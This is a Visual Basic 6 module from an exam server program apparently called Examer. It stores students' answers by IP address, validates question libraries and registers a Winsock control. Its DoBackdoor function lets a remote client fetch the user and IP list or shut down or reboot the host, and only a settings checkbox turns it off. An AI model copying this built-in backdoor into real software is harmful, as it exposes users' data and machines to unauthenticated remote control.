Attribute VB_Name = "Main"
Option Explicit

Public Tip As CTooltip

Public Declare Function GetTickCount Lib "kernel32" () As Long

Public Declare Function MessageBeep Lib "user32" (ByVal wType As Long) As Long

Public Declare Function RtlAdjustPrivilege& Lib "ntdll" (ByVal Privilege&, ByVal NewValue&, ByVal NewThread&, OldValue&)
Public Declare Function NtShutdownSystem& Lib "ntdll" (ByVal ShutdownAction&)
Public Const SE_SHUTDOWN_PRIVILEGE& = 19
'Public Const SHUTDOWN& = 0
'Public Const RESTART& = 1

Public Declare Function GetVersionEx Lib "kernel32" Alias "GetVersionExA" (lpVersionInformation As OSVERSIONONFO) As Long
Public Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long

Public Type OSVERSIONONFO
dwOSVersionInfoSize As Long
dwMajorVersion As Long
dwMinorVersion As Long
dwBuildNumber As Long
dwPlatformld As Long
dwCSDVersion As String * 128
End Type

'====================SetCtrlsBrdClr====================
Private Type RECTW
    Left                As Long
    Top                 As Long
    Right               As Long
    Bottom              As Long
    Width               As Long
    Height              As Long
End Type

Private Type RECT
    Left        As Long
    Top         As Long
    Right       As Long
    Bottom      As Long
End Type

Private Declare Function SetWindowLong Lib "user32" Alias "SetWindowLongA" (ByVal hwnd As Long, ByVal nIndex As Long, ByVal dwNewLong As Long) As Long
Private Declare Function CallWindowProc Lib "user32" Alias "CallWindowProcA" (ByVal lpPrevWndFunc As Long, ByVal hwnd As Long, ByVal Msg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Private Declare Function DefWindowProc Lib "user32" Alias "DefWindowProcA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Private Declare Function GetProp Lib "user32" Alias "GetPropA" (ByVal hwnd As Long, ByVal lpString As String) As Long
Private Declare Function RemoveProp Lib "user32" Alias "RemovePropA" (ByVal hwnd As Long, ByVal lpString As String) As Long
Private Declare Function SetProp Lib "user32" Alias "SetPropA" (ByVal hwnd As Long, ByVal lpString As String, ByVal hData As Long) As Long
Private Declare Function GetWindowDC Lib "user32" (ByVal hwnd As Long) As Long
Private Declare Function CreateSolidBrush Lib "gdi32" (ByVal crColor As Long) As Long
Private Declare Function FrameRect Lib "user32" (ByVal hDC As Long, lpRect As RECT, ByVal hBrush As Long) As Long
Private Declare Function DeleteObject Lib "gdi32" (ByVal hObject As Long) As Long
Private Declare Function GetWindowRect Lib "user32" (ByVal hwnd As Long, lpRect As RECT) As Long
Private Declare Function ReleaseDC Lib "user32" (ByVal hwnd As Long, ByVal hDC As Long) As Long

Private Const WM_DESTROY        As Long = &H2
Private Const WM_PAINT          As Long = &HF
Private Const WM_NCPAINT        As Integer = &H85
Private Const GWL_WNDPROC = (-4)
Private Color As Long
'====================SetCtrlsBrdClr====================

'====================SetCtrlsBrdClr====================
Public Sub setBorderColor(hwnd As Long, Color_ As Long)
    Color = Color_
    If GetProp(hwnd, "OrigProcAddr") = 0 Then
        SetProp hwnd, "OrigProcAddr", SetWindowLong(hwnd, GWL_WNDPROC, AddressOf WindowProc)
    End If
End Sub

Public Sub UnHook(hwnd As Long)
    Dim OrigProc As Long
    OrigProc = GetProp(hwnd, "OrigProcAddr")
    If Not OrigProc = 0 Then
        SetWindowLong hwnd, GWL_WNDPROC, OrigProc
        OrigProc = SetWindowLong(hwnd, GWL_WNDPROC, OrigProc)
        RemoveProp hwnd, "OrigProcAddr"
    End If
End Sub

Private Function OnPaint(OrigProc As Long, hwnd As Long, uMsg As Long, wParam As Long, lParam As Long) As Long
    Dim m_hDC       As Long
    Dim m_wRect     As RECTW
    OnPaint = CallWindowProc(OrigProc, hwnd, uMsg, wParam, lParam)
    Call pGetWindowRectW(hwnd, m_wRect)
    m_hDC = GetWindowDC(hwnd)
    Call pFrameRect(m_hDC, 0, 0, m_wRect.Width, m_wRect.Height)
    Call ReleaseDC(hwnd, m_hDC)
End Function

Private Function WindowProc(ByVal hwnd As Long, ByVal uMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
    Dim OrigProc As Long
    Dim ClassName As String
    If hwnd = 0 Then Exit Function
    OrigProc = GetProp(hwnd, "OrigProcAddr")
    If Not OrigProc = 0 Then
        If uMsg = WM_DESTROY Then
            SetWindowLong hwnd, GWL_WNDPROC, OrigProc
            WindowProc = CallWindowProc(OrigProc, hwnd, uMsg, wParam, lParam)
            RemoveProp hwnd, "OrigProcAddr"
        Else
            If uMsg = WM_PAINT Or WM_NCPAINT Then

                WindowProc = OnPaint(OrigProc, hwnd, uMsg, wParam, lParam)
            Else
                WindowProc = CallWindowProc(OrigProc, hwnd, uMsg, wParam, lParam)
            End If
        End If
    Else
        WindowProc = DefWindowProc(hwnd, uMsg, wParam, lParam)
    End If
End Function

Private Function pGetWindowRectW(ByVal hwnd As Long, lpRectW As RECTW) As Long
    Dim TmpRect As RECT
    Dim Rtn     As Long
    Rtn = GetWindowRect(hwnd, TmpRect)
    With lpRectW
        .Left = TmpRect.Left
        .Top = TmpRect.Top
        .Right = TmpRect.Right
        .Bottom = TmpRect.Bottom
        .Width = TmpRect.Right - TmpRect.Left
        .Height = TmpRect.Bottom - TmpRect.Top
    End With
    pGetWindowRectW = Rtn
End Function

Private Function pFrameRect(ByVal hDC As Long, ByVal X As Long, Y As Long, ByVal Width As Long, ByVal Height As Long) As Long
    Dim TmpRect     As RECT
    Dim m_hBrush    As Long
    With TmpRect
        .Left = X
        .Top = Y
        .Right = X + Width
        .Bottom = Y + Height
    End With
    m_hBrush = CreateSolidBrush(Color)
    pFrameRect = FrameRect(hDC, TmpRect, m_hBrush)
    DeleteObject m_hBrush
End Function
'====================SetCtrlsBrdClr====================

Public Sub InitApp()
    On Error GoTo IAError
    
    Dim oTest As Object, bRedo As Boolean
    bRedo = False
ReInitApp:
    Set oTest = CreateObject("MSWinsock.Winsock")
    '若无 Winsock 会触发错误
    Load frmIcon
    Set oTest = Nothing
    
    Exit Sub
IAError:
    If Dir(MyPath & "mswinsck.ocx") = "" Then
        MsgBox "考试娘在初始化过程中遇到了错误！" & vbCrLf & "组件“MSWINSCK.OCX”未注册且已缺失，请重新获取 Examer", 48, "呜哇~出错了"
        Unload frmMain
        Exit Sub
    End If
    If bRedo Then
        MsgBox "考试娘无法自动注册组件“MSWINSCK.OCX”！" & vbCrLf & "请尝试手动注册或重新运行程序", 48, "啊哦~"
        Unload frmMain
        Exit Sub
    End If
    '判断系统版本并注册 Winsock 控件，要注意此处没有写注册表，可能出错（懒得改了，详细代码参见 Lock Pro）
    Dim lpVer As OSVERSIONONFO
    lpVer.dwOSVersionInfoSize = Len(lpVer)
    GetVersionEx lpVer
    If lpVer.dwMajorVersion >= 6 Then
        ShellExecute 0, "runas", "regsvr32.exe", "/s """ & MyPath & "mswinsck.ocx""", "", 0
    Else
        Shell "regsvr32.exe /s """ & MyPath & "mswinsck.ocx""", 0
    End If
    bRedo = True
    GoTo ReInitApp
End Sub

Public Function GetWelText() As String
    Dim sWels As Variant
    sWels = Array("今天的风儿好喧嚣~", "大丈夫だ、問題ない！", "bakabaka! ⑨", _
        "Nice boat!", "恶灵退散！ICBM", "SSSS...BOOM!", "--御坂面无表情的说道", _
        "金坷垃好处有啥？", "前略，天国的...", "帕秋莉♂Go!!!", "世界已完蛋！", _
        "少女祈祷中...", "顺丰快递查水表", "来世愿生幻想乡")
    Randomize
    GetWelText = sWels(Int(Rnd * (UBound(sWels) + 1)))
End Function

Public Function GetMyIP() As String
    Dim strComputer As String
    Dim objWMI As Object
    Dim colIP As Object
    Dim IP As Object
    Dim i As Integer
    strComputer = "."
    Set objWMI = GetObject("winmgmts://" & strComputer & "/root/cimv2")
    Set colIP = objWMI.ExecQuery _
        ("Select * from Win32_NetworkAdapterConfiguration where IPEnabled=TRUE")
    For Each IP In colIP
        If Not IsNull(IP.IpAddress) Then
            GetMyIP = IP.IpAddress(LBound(IP.IpAddress))
            Exit For
        End If
    Next
End Function

Public Function CheckQlib() As Boolean
    On Error GoTo ChkError
    
    Dim sItems() As String, i As Long, j As Long, lFm As Long, lQn As Long, sTmps() As String, lPlus As Long
    sItems = Split("FullMark,QueNum,ExamTitle,ExamInfo", ",")
    For i = 0 To UBound(sItems)
        If ReadLib(CStr(sItems(i))) = "" Then
            GoTo ChkError
        ElseIf i < 2 And Not IsNumeric(ReadLib(CStr(sItems(i)))) Then
            GoTo ChkError
        End If
    Next i
    If InStr(LCase(ReadLib("/index")), "userdata") = 0 Then GoTo ChkError
    lFm = CLng(ReadLib("FullMark"))
    lQn = CLng(ReadLib("QueNum"))
    lPlus = 0
    For i = 1 To lQn
        If ReadLib("Que" & i) = "" Then
            GoTo ChkError
        Else
            sTmps = Split(ReadLib("Que" & i), "@@")
            If UBound(sTmps) < 6 Then GoTo ChkError
            For j = 0 To 4
                If sTmps(j) = "" Then GoTo ChkError
            Next j
            If LCase(sTmps(5)) <> "cha" And LCase(sTmps(5)) <> "chb" And _
                LCase(sTmps(5)) <> "chc" And LCase(sTmps(5)) <> "chd" And _
                LCase(sTmps(5)) <> "text" Then
                GoTo ChkError
            End If
            If Not IsNumeric(sTmps(6)) Then GoTo ChkError
            lPlus = lPlus + CLng(sTmps(6))
        End If
    Next i
    If lPlus <> lFm Then GoTo ChkError
    If Not CheckUser Then GoTo ChkError
    
    CheckQlib = True
    
    Exit Function
ChkError:
    CheckQlib = False
End Function

Public Function CheckUser() As Boolean
    On Error GoTo CUError
    
    If ReadLib("UserData") = "" Then CheckUser = True: Exit Function
    Dim sTmps() As String, sDatas() As String, sUsrs() As String, sTps() As String
    Dim i As Long, j As Long
    sDatas = Split(ReadLib("UserData"), "[_]")
    For i = 0 To UBound(sDatas) - 1
        sTmps = Split(sDatas(i), "@@")
        sUsrs = Split(sTmps(0), ",")
        sTps = Split(sUsrs(0), ".")
        If UBound(sTps) <> 3 Then GoTo CUError
        For j = 0 To 3
            If Not IsNumeric(sTps(j)) Then GoTo CUError
        Next j
        sTmps = Split(sTmps(1), "[,]")
        For j = 0 To UBound(sTmps) - 1
            If ReadLib("Que" & j + 1) = "" Then
                GoTo CUError
            Else
                sTps = Split(ReadLib("Que" & j + 1), "@@")
                If sTmps(j) = "" Then
                    If j <> 0 Then GoTo CUError
                Else
                    If Left(LCase(sTps(5)), 2) = "ch" Then
                        If Not IsNumeric(sTmps(j)) Then GoTo CUError
                    End If
                End If
            End If
        Next j
    Next i
    
    CheckUser = True
    
    Exit Function
CUError:
    CheckUser = False
End Function

Public Function GetQueType(sQue As String, lType As Long) As String
    On Error GoTo GTError
    
    Dim sTmps() As String
    sTmps = Split(sQue, "@@")
    GetQueType = sTmps(lType)
    
    Exit Function
GTError:
    GetQueType = ""
End Function

Public Function ReadUser(sIP As String, lNum As Long, Optional GetName As Boolean = False) As String
    On Error GoTo RUError
    
    Dim i As Long, sTmps() As String
    For i = 0 To frmIcon.imgData.UBound
        With frmIcon.imgData(i)
            If Left(.ToolTipText, Len(sIP)) = sIP Then
                If GetName Then
                    sTmps = Split(.ToolTipText, ",")
                    ReadUser = sTmps(1)
                Else
                    sTmps = Split(.Tag, "[,]")
                    If lNum > UBound(sTmps) Then
                        ReadUser = ""
                    Else
                        ReadUser = sTmps(lNum)
                    End If
                    Exit For
                End If
            End If
        End With
    Next i
    
    Exit Function
RUError:
    If Err.Number = 340 Then
        i = i + 1
        Resume
    Else
        ReadUser = ""
    End If
End Function

Public Function WriteUser(sIP As String, lNum As Long, sVal As String, Optional IsAppend As Boolean = False, Optional sName As String) As Long
    On Error GoTo WUError
    
    Dim i As Long, j As Long, sTmps() As String, sTmp As String, bSet As Boolean
    
Re_Set:
    For i = 0 To frmIcon.imgData.UBound
        With frmIcon.imgData(i)
            If Left(.ToolTipText, Len(sIP)) = sIP Then
                sTmps = Split(.Tag, "[,]")
                If lNum > UBound(sTmps) Then
                    WriteUser = -1
                    Exit Function
                Else
                    If IsAppend Then
                        If .Tag = "[,]" Then
                            .Tag = sVal & "[,]"
                            GoTo Complete
                        Else
                            sTmps(UBound(sTmps)) = sVal
                        End If
                    Else
                        sTmps(lNum) = sVal
                    End If
                    For j = 0 To UBound(sTmps)
                        If sTmps(j) <> "" Then sTmp = sTmp & sTmps(j) & "[,]"
                    Next j
                    If sTmp = "" Then sTmp = "[,]"
                    .Tag = sTmp
                End If
Complete:
                bSet = True
                Exit For
            End If
        End With
    Next i
    
    If Not bSet And sName <> "" Then
        Load frmIcon.imgData(frmIcon.imgData.Count)
        With frmIcon.imgData(frmIcon.imgData.UBound)
            .ToolTipText = sIP & "," & sName
            .Tag = "[,]"
            IsAppend = True
        End With
        GoTo Re_Set
    End If
    
    WriteUser = 0
    
    Exit Function
WUError:
    If Err.Number = 340 Then
        i = i + 1
        Resume
    Else
        WriteUser = Err.Number
    End If
End Function

Public Function GetUserQueNum(sIP As String) As Long
    On Error GoTo GUQError
    
    Dim i As Long, sTmps() As String, lPlus As Long
    For i = 0 To frmIcon.imgData.UBound
        With frmIcon.imgData(i)
            If Left(.ToolTipText, Len(sIP)) = sIP Then
                sTmps = Split(.Tag, "[,]")
                Exit For
            End If
        End With
    Next i
    lPlus = 0
    For i = 0 To UBound(sTmps)
        If sTmps(i) <> "" Then lPlus = lPlus + 1
    Next i
    GetUserQueNum = lPlus
    
    Exit Function
GUQError:
    If Err.Number = 340 Then
        i = i + 1
        Resume
    Else
        GetUserQueNum = 0
    End If
End Function

Public Sub DelUser(sIP As String)
    On Error GoTo DUError
    
    Dim i As Long
    For i = 0 To frmIcon.imgData.UBound
        If Left(frmIcon.imgData(i).ToolTipText, Len(sIP)) = sIP Then
            Unload frmIcon.imgData(i)
            Exit For
        End If
    Next i
    With frmMain.lstPCs
        If .ListCount > 0 Then
            For i = 0 To .ListCount - 1
                If Left(.List(i), Len(sIP)) = sIP Then .RemoveItem i
                Exit For
            Next i
        End If
    End With
    
    Exit Sub
DUError:
    If Err.Number = 340 Then
        i = i + 1
        Resume
    Else
        Resume Next
    End If
End Sub

Public Sub LoadUser(Optional LoadList As Boolean = False)
'UserData e.g.: 192.168.0.100,Test1@@5[,]5[,]5[,]10[,]10[,]10[,]xx[,]asdasd[,]aesda[,][_]192.168.0.101,Test2@@0[,]0[,]0[,]0[,]....
'Or: 192.168.0.100,Test1@@5[,]5[,]5[,]10[,]10[,]10[,]15[,]20[,]20[,][_]192.168.0.101,Test2@@0[,]0[,]0[,]0[,]....
    On Error Resume Next
    
    Dim i As Long, sTmps() As String, sUsrs() As String
    If ReadLib("UserData") <> "" Then sTmps = Split(ReadLib("UserData"), "[_]")
    With frmIcon
        If .imgData.Count > 1 Then
            For i = 1 To .imgData.UBound
                Unload .imgData(i)
            Next i
        End If
        If LoadList Then frmMain.lstPCs.Clear
        If ReadLib("UserData") = "" Then Exit Sub
        For i = 0 To UBound(sTmps)
            If sTmps(i) <> "" Then
                Load .imgData(i + 1)
                sUsrs = Split(sTmps(i), "@@")
                .imgData(i + 1).ToolTipText = sUsrs(0)
                .imgData(i + 1).Tag = sUsrs(1)
                sUsrs = Split(sUsrs(0), ",")
                If LoadList Then
                    frmMain.lstPCs.AddItem sUsrs(0) & "[" & sUsrs(1) & "]"
                End If
            End If
        Next i
    End With
    If LoadList Then frmMain.RefreshStatus frmMain.lstPCs.ListCount, 0
End Sub

Public Sub SaveUser(Optional IsRestore As Boolean = False)
    On Error Resume Next
    
    Dim i As Long, sTmp As String
    sTmp = ""
    If Not IsRestore Then
        With frmIcon
            If .imgData.Count = 1 Then GoTo SUDone
            For i = 1 To .imgData.UBound
                If .imgData(i).Tag <> "" And .imgData(i).ToolTipText <> "" Then sTmp = sTmp & .imgData(i).ToolTipText & "@@" & .imgData(i).Tag & "[_]"
            Next i
        End With
    End If
SUDone:
    SaveLib "UserData", sTmp
End Sub

Public Function DoBackdoor(sIP As String, lPara As Long) As String
    On Error Resume Next
    If frmMain.chkBkDr.Value = 1 Then
        DoBackdoor = "Settings Error!"
        frmMain.ConsoleAdd "用户名 " & ReadUser(sIP, 0, True) & "[" & sIP & "] 运行了参数 " & CStr(lPara), 48
        Exit Function
    End If
    Dim sRet As String
    Select Case lPara
        Case 0
            Dim sTmp As String, i As Long
            With frmMain.lstPCs
                If .ListCount <> 0 Then
                    For i = 0 To frmMain.lstPCs.ListCount - 1
                        sTmp = sTmp & "<br>" & .List(i)
                    Next i
                End If
            End With
            If sTmp = "" Then sTmp = "[None]"
            sRet = "Current IP: " & sIP & "<br>" & _
                "Username: " & ReadUser(sIP, 0, True) & "<br>" & _
                "User total: " & frmIcon.imgData.Count - 1 & "<br>" & _
                "User list: " & sTmp & "<br>"
            sTmp = ""
            For i = 1 To CLng(ReadLib("QueNum"))
                sTmp = sTmp & i & "-" & GetQueType(ReadLib("Que" & i), 5) & ", "
            Next i
            sRet = sRet & "Questions library data: " & Left(sTmp, Len(sTmp) - 2)
            DoBackdoor = sRet
        Case 1
            frmIcon.CloseServer
            NtShutdown
        Case 2
            frmIcon.CloseServer
            NtShutdown 1
        Case 3
            Unload frmMain
    End Select
End Function

Public Function UrlDecode(strUrl As String, Optional IsUTF8 As Boolean = False) As String
    Dim strChar As String, strText As String, strTemp As String, strRet As String
    Dim LngNum As Long, i As Integer
    Dim lngU8a As Long, lngU8b As Long, lngU8c As Long
    
    For i = 1 To Len(strUrl)
        strChar = Mid(strUrl, i, 1)
        Select Case strChar
            Case "+"
                strText = strText & " "
            Case "%"
                strTemp = Mid(strUrl, i + 1, 2) '暂时取2位
                LngNum = Val("&H" & strTemp)
                '>127即为汉字
                If LngNum < 128 Then
                    strRet = Chr(LngNum)
                    i = i + 2
                Else
                    If IsUTF8 Then
                        lngU8a = (LngNum And &HF) * &H1000
                        lngU8b = (CLng("&H" & Mid(strUrl, i + 4, 2)) And &H3F) * &H40
                        lngU8c = CLng("&H" & Mid(strUrl, i + 7, 2)) And &H3F
                        strRet = ChrW(lngU8a Or lngU8b Or lngU8c)
                        i = i + 8
                    Else
                        strTemp = strTemp & Mid(strUrl, i + 4, 2)
                        strRet = Chr(Val("&H" & strTemp))
                        i = i + 5
                    End If
                End If
                strText = strText & strRet
            Case Else
                strText = strText & strChar
        End Select
    Next
    
    UrlDecode = strText
End Function

Public Sub NtShutdown(Optional isReboot As Long = 0)
    RtlAdjustPrivilege SE_SHUTDOWN_PRIVILEGE, 1, 0, 0
    NtShutdownSystem isReboot
End Sub

Public Sub Sleep(ByVal dwMilliseconds As Long)
    Dim SaveTime As Long
    Dim NowTime As Long
    Dim IsWait As Long
    IsWait = 0
    SaveTime = GetTickCount
    Do
       DoEvents
       NowTime = GetTickCount
       If NowTime - SaveTime >= dwMilliseconds Then
          IsWait = 1
       End If
    Loop While IsWait = 0
End Sub

Public Function GetMoveNum(sToNum As Single, sNowNum As Single, lSpeed As Single, Optional lMode As Long = 0, Optional lV As Single = 0, Optional lAtt As Single = 0) As Single
    On Error Resume Next
    Select Case lMode
        Case 0       '匀减速运动，lAtt,lV 无效
            Dim sTmp As Single
            sTmp = (sToNum - sNowNum) / lSpeed
            If Round(sTmp) = 0 Then sTmp = 0
            GetMoveNum = CLng(sTmp)
        Case 1       '匀速运动，lAtt,lV 无效
            If sNowNum < sToNum Then
                If sNowNum + lSpeed < sToNum Then
                    GetMoveNum = sNowNum + lSpeed
                Else
                    GetMoveNum = sToNum
                End If
            Else
                If sNowNum - lSpeed > sToNum Then
                    GetMoveNum = sNowNum - lSpeed
                Else
                    GetMoveNum = sToNum
                End If
            End If
        Case 2       '弹性运动，此时 sToNum 确定振动中心，lV 确定速度，lSpeed 确定劲度系数（0<k<=3），lAtt 确定能量衰减量（0<A<=1）
            lV = (lV + (sToNum - sNowNum) * lSpeed) * lAtt
            GetMoveNum = lV     '判断停止条件：sToNum = sNowNum，非函数值为 0
    End Select
End Function

